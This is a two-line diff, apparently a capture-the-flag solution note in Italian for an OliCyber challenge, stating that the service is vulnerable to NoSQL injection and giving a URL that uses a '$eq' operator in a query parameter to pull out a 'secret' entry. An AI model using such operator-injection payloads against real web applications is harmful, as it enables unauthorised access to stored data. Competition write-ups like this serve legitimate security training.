@@ -1,0 +1,2 @@
+vulnerabile a nosql basta filtrare con questo url 
+http://bibbodb.challs.olicyber.it/type?filter[$eq]=secret
